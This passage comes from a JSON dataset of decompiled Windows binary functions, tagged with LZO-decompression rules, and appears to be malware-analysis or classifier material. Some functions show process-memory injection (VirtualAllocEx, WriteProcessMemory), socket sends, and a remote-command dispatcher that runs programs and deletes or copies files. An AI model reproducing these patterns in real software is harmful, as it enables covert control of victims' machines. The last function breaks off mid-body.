        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.0047377c(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_30h;\n    uint *var_2ch;\n    uint32_t var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar2 = 6;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_18h = 0x47379c;\n    var_ch = param_2;\n    fcn.004059cc();\n    var_1ch = 0x473916;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0047377c::var_20h;\n    var_24h = 0x4737b2;\n    var_18h = &stack0xfffffffc;\n    fcn.00405530();\n    var_24h = 0x4737ba;\n    cVar1 = fcn.0040a26c();\n    if (cVar1 != '\\0') {\n        var_24h = 0x4737cd;\n        fcn.0048aab0();\n        if (var_8h != 0) {\n            var_8h = *(var_8h + -4);\n        }\n        if (0 < var_8h) {\n            var_24h = 0x4737ed;\n            var_10h = fcn.00404620();\n            var_28h = 0x4738e7;\n            var_2ch = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.0047377c::var_2ch;\n            var_24h = &stack0xfffffffc;\n            (**(*var_10h + 0x2c))();\n            iVar2 = (**(*var_10h + 0x14))();\n            if (-1 < iVar2 + -1) {\n                do {\n                    (**(*var_10h + 0xc))();\n                    cVar1 = fcn.00489a38();\n                    if (cVar1 != '\\0') {\n                        (**(*var_10h + 0x20))();\n                    }\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            (**(*var_10h + 0x1c))();\n            fcn.00409b7c();\n            (**(*var_10h + 0x2c))();\n            *in_FS_OFFSET = var_2ch;\n            var_24h = 0x4738ee;\n            var_28h = *0x473930;\n            var_2ch = &fcn.0047377c::var_20h;\n            (**(*var_10h + 0x1c))();\n            fcn.0040ef44(var_2ch, var_28h);\n            (**(*var_10h + 0x2c))();\n            (**(*var_10h + 0x1c))();\n            fcn.0048bf2c(var_28h);\n            fcn.00405864();\n            fcn.004616b4();\n            fcn.00404650();\n            return;\n        }\n    }\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x47391d;\n    var_1ch = 0x473908;\n    fcn.00405554();\n    var_1ch = 0x473915;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 940
    },
    "00473978": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00473978(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x473a27;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack32;\n    fcn.00405c6c();\n    iVar2 = var_4h;\n    if (var_4h != 0) {\n        iVar2 = *(var_4h + -4);\n    }\n    uVar1 = fcn.004059dc(iVar2);\n    sub.kernel32.dll_GetWindowsDirectoryA(uVar1);\n    fcn.00405c6c();\n    uVar3 = var_4h == 0 || var_4h == 4;\n    fcn.00405a44();\n    fcn.00405974();\n    if (uVar3) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405864();\n    }\n    *in_FS_OFFSET = &var_8h;\n    fcn.00405554(0x473a2e);\n    return;\n}\n",
        "token_count": 323
    },
    "0047433c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0047433c(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00405530();\n    if (in_EAX < 4) {\n        if (in_EAX == 3) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == -0x80000000) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == -1) {\n            fcn.00405584();\n        }\n        else {\n            if (in_EAX == 1) {\n                fcn.00405584();\n                return;\n            }\n            if (in_EAX == 2) {\n                fcn.00405584();\n                return;\n            }\n        }\n    }\n    else {\n        if (in_EAX == 4) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 5) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 6) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 7) {\n            fcn.00405584();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "004744b8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004744b8(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00405530();\n    if (in_EAX < 3) {\n        if (in_EAX == 2) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == -0x80000000) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == -1) {\n            fcn.00405584();\n        }\n        else {\n            if (in_EAX == 0) {\n                fcn.00405584();\n                return;\n            }\n            if (in_EAX == 1) {\n                fcn.00405584();\n                return;\n            }\n        }\n    }\n    else {\n        if (in_EAX == 4) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 5) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 0x100) {\n            fcn.00405584();\n            return;\n        }\n        if (in_EAX == 0x101) {\n            fcn.00405584();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 277
    },
    "00474638": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00474638(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack104;\n    uint uStack100;\n    uint *arg_8h;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t *var_28h;\n    int32_t var_24h;\n    int32_t *var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack84 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    uStack88 = 0x474a0a;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    cVar1 = fcn.00474208();\n    if (cVar1 != '\\0') {\n        uStack100 = 0x4749d3;\n        iStack104 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff98;\n        fcn.00405530();\n        fcn.00405530();\n        fcn.00405530();\n        iVar2 = (***0x494bb4)(1, 0, &fcn.00474638::var_1ch, &fcn.00474638::var_18h);\n        if (iVar2 == 0) {\n            uStack100 = 0;\n            iStack104 = var_18h;\n            iVar2 = (***0x49497c)();\n            if (iVar2 == 0) {\n                var_2ch = *var_20h;\n                if (-1 < var_2ch + -1) {\n                    var_24h = 0;\n                    do {\n                        uStack100 = 0x474717;\n                        fcn.004057b8();\n                        uStack100 = 0;\n                        iStack104 = 0x474a20;\n                        fcn.004058e0();\n                        fcn.004097a0(var_10h);\n                        fcn.004058e0(0x474a2c, 0);\n                        iVar2 = (***0x494b80)(var_18h, var_20h + var_20h[1] * 0x85 + 2, 1, 0, &fcn.00474638::var_28h);\n                        if (iVar2 != 0) {\n                            fcn.00404f70();\n                            goto code_r0x004749da;\n                        }\n                        iVar2 = *var_28h;\n                        if (-1 < iVar2 + -1) {\n                            do {\n                                arg_8h = &fcn.00474638::var_8h;\n                                uStack100 = 0x4747b2;\n                                fcn.0040642c();\n                                uStack100 = 0x4747cb;\n                                fcn.0040af98(arg_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    uStack100 = 0x4747e8;\n                                    fcn.004055c8();\n                                }\n                                uStack100 = var_ch;\n                                iStack104 = var_8h;\n                                fcn.004058e0(0x474a20);\n                                fcn.00405728();\n                                fcn.0040af98(&fcn.00474638::var_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    fcn.004055c8();\n                                }\n                                fcn.004058e0(0x474a20, var_8h, var_ch);\n                                fcn.0040af98(&fcn.00474638::var_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    fcn.004055c8();\n                                }\n                                fcn.004058e0(0x474a20, 0x474a5c, var_8h, var_ch);\n                                fcn.0047433c();\n                                fcn.0040af98(&fcn.00474638::var_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    fcn.00405530();\n                                }\n                                fcn.004058e0(0x474a20, var_8h, var_ch);\n                                fcn.004744b8();\n                                fcn.0040af98(&fcn.00474638::var_8h);\n                                iVar3 = var_8h;\n                                if (var_8h != 0) {\n                                    iVar3 = *(var_8h + -4);\n                                }\n                                if (iVar3 < 1) {\n                                    fcn.00405530();\n                                }\n                                iStack92 = 0x474a2c;\n                                fcn.004058e0();\n                                iVar2 = iVar2 + -1;\n                            } while (iVar2 != 0);\n                        }\n                        var_24h = var_24h + 1;\n                        var_2ch = var_2ch + -1;\n                    } while (var_2ch != 0);\n                }\n                uStack100 = 0x474a68;\n                iStack104 = 0x474a2c;\n                fcn.004058e0(var_10h);\n                (***0x494cf0)(var_18h, 0);\n                *in_FS_OFFSET = var_18h;\n                fcn.00474324(0x4749da);\n                return;\n            }\n            fcn.00404f70();\n        }\n        else {\n            fcn.00404f70();\n        }\n    }\ncode_r0x004749da:\n    *in_FS_OFFSET = iStack92;\n    puStack84 = 0x474a11;\n    uStack88 = 0x4749ef;\n    fcn.00405530();\n    uStack88 = 0x4749fc;\n    fcn.00405554();\n    uStack88 = 0x474a09;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1562
    },
    "00474a6c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t fcn.00474a6c(void)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    bool bVar3;\n    bool bVar4;\n    uint8_t *in_EAX;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint16_t uVar7;\n    uint8_t uVar8;\n    uint16_t uVar9;\n    uint *in_FS_OFFSET;\n    uchar auStack48 [12];\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    uVar2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack48;\n    puVar6 = in_EAX;\n    if (in_EAX != NULL) {\n        bVar4 = false;\n        bVar3 = false;\n        var_8h = 4;\n        var_14h = 0;\n        do {\n            puVar5 = puVar6;\n            uVar1 = *puVar5;\n            uVar9 = uVar1;\n            puVar6 = puVar5 + 1;\n            if (uVar1 == 0x66) {\n                var_8h = 2;\n            }\n            else if (uVar1 == 0x67) {\n                bVar4 = true;\n            }\n            else if (((uVar1 & 0xe7) != 0x26) && (1 < uVar1 - 100)) {\n                bVar3 = true;\n            }\n        } while (!bVar3);\n        if (uVar1 == 0xf) {\n            uVar7 = *(*puVar6 * 2 + 0x494430);\n            uVar9 = *puVar6 + 0xf00;\n            puVar6 = puVar5 + 2;\n        }\n        else {\n            uVar7 = *(uVar1 * 2 + 0x494230);\n        }\n        if ((uVar7 & 0x38) != 0) {\n            uVar1 = *puVar6;\n            uVar8 = uVar1 & 7;\n            puVar6 = puVar6 + 1;\n            if ((uVar1 & 0xc0) == 0x40) {\n                var_10h = 1;\n            }\n            else if ((uVar1 & 0xc0) == 0x80) {\n                if (bVar4) {\n                    var_10h = 2;\n                }\n                else {\n                    var_10h = 4;\n                }\n            }\n            else {\n                var_10h = 0;\n            }\n            if (!((uVar1 & 0xc0) != 0xc0 & bVar4)) {\n                if ((uVar8 == 4) && ((uVar1 & 0xc0) != 0xc0)) {\n                    uVar8 = *puVar6 & 7;\n                }\n                if (((uVar1 & 0xc0) == 0) && (uVar8 == 5)) {\n                    var_10h = 4;\n                }\n                puVar6 = puVar6 + var_10h;\n            }\n            if ((uVar7 & 0x38) == 8) {\n    // switch table (32 cases) at 0x474be7\n                switch(uVar9) {\n                case 0xd8:\n                    var_14h = 2;\n                    break;\n                case 0xd9:\n                    var_14h = 3;\n                    break;\n                case 0xda:\n                    var_14h = 4;\n                    break;\n                case 0xdb:\n                    var_14h = 5;\n                    break;\n                case 0xdc:\n                    var_14h = 6;\n                    break;\n                case 0xdd:\n                    var_14h = 7;\n                    break;\n                case 0xde:\n                    var_14h = 8;\n                    break;\n                case 0xdf:\n                    var_14h = 9;\n                    break;\n                case 0xf6:\n                    var_14h = 0;\n                    break;\n                case 0xf7:\n                    var_14h = 1;\n                }\n                if ((uVar1 & 0xc0) == 0xc0) {\n                    uVar7 = *(var_14h * 0x20 + 0x494640 + (uVar1 >> 3 & 7) * 2);\n                }\n                else {\n                    uVar7 = *(var_14h * 0x20 + 0x494630 + (uVar1 >> 3 & 7) * 2);\n                }\n            }\n        }\n        uVar7 = uVar7 & 0xc00;\n        if (uVar7 == 0x400) {\n            puVar6 = puVar6 + 1;\n        }\n        else if (uVar7 == 0x800) {\n            puVar6 = puVar6 + 2;\n        }\n        else if (uVar7 == 0xc00) {\n            puVar6 = puVar6 + var_8h;\n        }\n        else {\n            if (uVar9 != 0x9a) {\n                if (uVar9 - 0xa0 < 4) {\n                    if (bVar4) {\n                        puVar6 = puVar6 + 2;\n                    }\n                    else {\n                        puVar6 = puVar6 + 4;\n                    }\n                    goto code_r0x00474d10;\n                }\n                if (uVar9 == 200) {\n                    puVar6 = puVar6 + 3;\n                    goto code_r0x00474d10;\n                }\n                if (uVar9 != 0xea) goto code_r0x00474d10;\n            }\n            puVar6 = puVar6 + var_8h + 2;\n        }\n    }\ncode_r0x00474d10:\n    *in_FS_OFFSET = uVar2;\n    return puVar6 - in_EAX;\n}\n",
        "token_count": 1346
    },
    "00474d58": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00474d87)\n// WARNING: Removing unreachable block (ram,0x00474db0)\n\nvoid fcn.00474d58(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint *puVar2;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint lpNumberOfBytesWritten;\n    \n    puStack32 = &stack0xfffffffc;\n    lpNumberOfBytesWritten = 0;\n    uStack36 = 0x474dde;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.00405728();\n    sub.kernel32.dll_VirtualAllocEx();\n    fcn.00405728();\n    puVar2 = &lpNumberOfBytesWritten;\n    uVar1 = 1;\n    sub.kernel32.dll_WriteProcessMemory();\n    *in_FS_OFFSET = in_EAX;\n    fcn.00405554(0x474de5, uVar1, puVar2);\n    return;\n}\n",
        "token_count": 251
    },
    "00475e2c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00475e2c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x475e44;\n    fcn.004059cc();\n    uStack28 = 0x475ebd;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.004613d8();\n    fcn.004055c8();\n    fcn.004055c8();\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    uVar1 = fcn.00405a3c(in_EAX, 0);\n    uVar2 = **0x494af0;\n    sub.wsock32.dll_send(uVar2, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x475ec4);\n    return;\n}\n",
        "token_count": 268
    },
    "00475ecc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00475ecc(uint param_1, int32_t param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x475ee6;\n    fcn.004059cc();\n    uStack28 = 0x475f58;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.004613d8();\n    fcn.004055c8();\n    fcn.004055c8();\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    fcn.00405a3c(param_2, 0);\n    sub.wsock32.dll_send();\n    *in_FS_OFFSET = in_EAX;\n    fcn.00405554(0x475f5f);\n    return;\n}\n",
        "token_count": 242
    },
    "00475f68": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00475f68(uint param_1, int32_t param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x475f7b;\n    fcn.004059cc();\n    uStack24 = 0x475fca;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.004055c8();\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    fcn.00405a3c(param_2, 0);\n    sub.wsock32.dll_send();\n    *in_FS_OFFSET = in_EAX;\n    fcn.00405530(0x475fd1);\n    return;\n}\n",
        "token_count": 218
    },
    "0047ee3c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.0047ee3c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    int32_t unaff_ESI;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    ulong uVar4;\n    uint in_stack_ffffffc0;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 4;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x47f0fe;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0047ee3c::var_20h;\n    var_14h = unaff_ESI;\n    var_10h = unaff_EBX;\n    uVar4 = fcn.0048a13c();\n    iVar2 = uVar4 >> 0x20;\n    uVar3 = iVar2 == *(in_EAX + 0x54);\n    if (uVar3) {\n        uVar3 = uVar4 == *(in_EAX + 0x50);\n        if (uVar4 < *(in_EAX + 0x50)) goto code_r0x0047f0d6;\n    }\n    else if (iVar2 < *(in_EAX + 0x54)) goto code_r0x0047f0d6;\n    fcn.00405974();\n    if (uVar3) {\n        uVar1 = fcn.004059dc(0, 0, 5);\n        in_stack_ffffffc0 = 0x47eea5;\n        sub.shell32.dll_ShellExecuteA(0, 0x47f120, uVar1);\n    }\n    else {\n        fcn.00405a44(&fcn.0047ee3c::var_8h);\n        fcn.00405974();\n        if (uVar3) {\n            fcn.00405a84();\n            fcn.004055c8();\n            fcn.00405974();\n            if (uVar3) {\n                uVar1 = fcn.004059dc(0, 0, 0);\n                in_stack_ffffffc0 = 0;\n                sub.shell32.dll_ShellExecuteA(0, 0x47f120, uVar1);\n            }\n            else {\n                uVar1 = fcn.004059dc(0, 0, 5);\n                in_stack_ffffffc0 = 0;\n                sub.shell32.dll_ShellExecuteA(0, 0x47f120, uVar1);\n            }\n        }\n        else {\n            fcn.00405974();\n            if (uVar3) {\n                uVar1 = fcn.004059dc(0, 0, 0);\n                in_stack_ffffffc0 = 0;\n                sub.shell32.dll_ShellExecuteA(0, 0x47f120, uVar1);\n                fcn.00475bd8();\n            }\n            else {\n                fcn.00405974();\n                if (uVar3) {\n                    uVar1 = fcn.004059dc(0, 0, 1);\n                    in_stack_ffffffc0 = 0;\n                    sub.shell32.dll_ShellExecuteA(0, 0x47f120, uVar1);\n                }\n                else {\n                    fcn.00405974();\n                    if (uVar3) {\n                        fcn.00489c78(0x80);\n                        fcn.00405818();\n                        uVar1 = fcn.004059dc();\n                        sub.kernel32.dll_SetFileAttributesA(uVar1);\n                        fcn.00489c78();\n                        fcn.00405818();\n                        var_14h = var_10h;\n                        uVar1 = fcn.004059dc();\n                        sub.kernel32.dll_DeleteFileA(uVar1);\n                        fcn.00489c78(0);\n                        fcn.00405818();\n                        uVar1 = fcn.004059dc();\n                        in_stack_ffffffc0 = fcn.004059dc(uVar1);\n                        sub.kernel32.dll_CopyFileA();\n                    }\n                    else {\n                        fcn.00405974();\n                        if (uVar3) {\n                            uVar1 = fcn.004059dc(0, 1);\n                            sub.winmm.dll_PlaySoundA(uVar1);\n                        }\n                        else {\n                            fcn.00405974();\n                            if (uVar3) {\n                                var_14h = **0x49487c;\n                                iVar2 = var_14h;\n                                if (var_14h != 0) {\n                                    iVar2 = *(var_14h + -4);\n                                }\n                                if (0 < iVar2) {\n                                    fcn.0040a5a0(0);\n                                    fcn.004735e8(var_20h);\n                                    fcn.004058e0(0x47f1cc, &fcn.0047ee3c::var_8h);\n                                    uVar1 = fcn.004059dc();\n                                    in_stack_ffffffc0 = fcn.004059dc(uVar1);\n                                    sub.kernel32.dll_CopyFileA();\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0047f0d6:\n    *in_FS_OFFSET = in_stack_ffffffc0;\n    fcn.00405554(0x47f105);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1339
    },
    "00480758": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00480758(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x48076b;\n    fcn.004059cc();\n    uStack24 = 0x4807cb;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    piVar1 = fcn.00404620();\n    *(in_EAX + 0x40) = piVar1;\n    (**(*piVar1 + 0x44))();\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    if (param_2 < 1) {\n        *(in_EAX + 0x48) = 0xffffffff;\n    }\n    else {\n        (**(**(in_EAX + 0x40) + 0x2c))();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4807d2;\n    uStack24 = 0x4807ca;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 309
    },
    "00480d08": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00480d65)\n// WARNING: Removing unreachable block (ram,0x00480d90)\n// WARNING: Removing unreachable block (ram,0x00480d6d)\n// WARNING: Removing unreachable block (ram,0x00480d98)\n\nvoid fcn.00480d08(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_eh;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x480e13;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fVar1 = fcn.0040bcf8();\n    fcn.0040bbe0(SUB84(fVar1, 0), fVar1 >> 0x20);\n    fVar1 = fcn.0040bcf8();\n    fcn.0040bc70(SUB84(fVar1, 0), fVar1 >> 0x20);\n    fcn.00409d70();\n    fcn.00409d70();\n    fcn.00409d70();\n    fcn.00409d70(0x480e34, 0, 0x480e34, 0, 0x480e34, 0);\n    uVar2 = 0x480e40;\n    fcn.004058e0(0x480e40, 0);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x480e1a);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 402
    },
    "00481318": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00481318(void)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    float10 fVar6;\n    ulong uVar7;\n    uint in_stack_ffffff34;\n    uint in_stack_ffffff40;\n    int32_t iVar8;\n    uint uStack168;\n    uint uStack164;\n    uchar *puStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uchar *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = 0xd;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    _var_20h = CONCAT44(0x481336, var_20h);\n    fcn.004059cc();\n    _var_20h = CONCAT44(&stack0xfffffffc, 0x4816c3);\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00481318::var_24h;\n    _var_28h = CONCAT44(uVar1, &stack0xfffffffc);\n    var_2ch = 0x481687;\n    var_30h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00481318::var_30h;\n    uVar5 = **0x4948f4 == 1;\n    if (!uVar5) {\n        var_34h = NULL;\n    // WARNING: Subroutine does not return\n        var_38h = 0x481363;\n        sub.kernel32.dll_ExitThread_1();\n    }\n    var_34h = 0x48136b;\n    fcn.00480f70();\n    var_34h = 0x481379;\n    fcn.00405974();\n    if (uVar5) goto code_r0x0048165f;\n    var_34h = 0x481387;\n    fcn.00480d08();\n    var_34h = 0x481394;\n    fcn.00405974();\n    if (!uVar5) {\n        var_38h = 0x4813c1;\n        var_3ch = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00481318::var_3ch;\n        var_40h = 0x4813b2;\n        var_34h = &stack0xfffffffc;\n        fcn.00403918();\n        var_40h = 0x4813b7;\n        fcn.0040305c();\n        *in_FS_OFFSET = var_3ch;\n        var_34h = 0x4813d8;\n        fcn.0048adcc();\n        var_38h = 0x4816dc;\n        var_3ch = 0x4813e8;\n        fcn.00480d08();\n        var_3ch = var_38h;\n        var_40h = 0x4813f8;\n        fcn.004058e0();\n        var_40h = 0x481405;\n        fcn.00403770();\n        var_40h = 0x48140d;\n        fcn.00480d08();\n        var_40h = 0x48141a;\n        fcn.00405584();\n    }\n    var_40h = 0x481427;\n    fcn.0048adcc();\n    var_40h = var_44h;\n    var_44h = 0x4816dc;\n    var_48h = 0x481437;\n    fcn.00480d08();\n    var_4ch = 0x481447;\n    fcn.004058e0();\n    var_4ch = 0x48144f;\n    cVar2 = fcn.0040a26c();\n    uVar5 = cVar2 == '\\0';\n    if (uVar5) {\n        var_4ch = 0x48146e;\n        fcn.00403500();\n        var_4ch = 0x481473;\n        fcn.0040305c();\n    }\n    else {\n        var_4ch = 0x48145d;\n        fcn.0040350c();\n        var_4ch = 0x481462;\n        fcn.0040305c();\n    }\n    var_4ch = 0x481478;\n    fVar6 = fcn.0040bcc4();\n    _var_20h = fVar6;\n    var_1ch = _var_20h >> 0x20;\n    var_4ch = var_1ch;\n    var_50h = var_20h;\n    var_54h = 0x481492;\n    fcn.0040c8f8();\n    var_54h = 0x4816ec;\n    var_58h = *0x494770;\n    var_5ch = 0x4816f8;\n    var_64h = 0x481704;\n    var_68h = 0x481710;\n    var_6ch = *0x494778;\n    uStack116 = 0x481710;\n    uStack120 = 0x4814c7;\n    fcn.004058e0();\n    uStack120 = 0x4814d4;\n    